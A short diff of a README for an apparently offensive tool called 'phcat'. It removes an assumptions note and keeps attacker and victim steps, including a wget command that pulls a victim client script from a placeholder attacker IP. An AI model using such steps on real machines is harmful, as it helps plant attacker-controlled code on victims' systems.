@@ -3,9 +3,6 @@
 ![phcat screenshot 2](/screenshots/screenshot2.png)
 ![phcat screenshot 3](/screenshots/screenshot3.png)
 
-# Assumptions
-- python3 exists on the server
-
 # Steps using HTTP web server
 1. (on attacker): python3 http_server.py
 2. (on victim): wget <ATTACKER_IP>:8000/victim_client_<ATTACKER_IP>.py
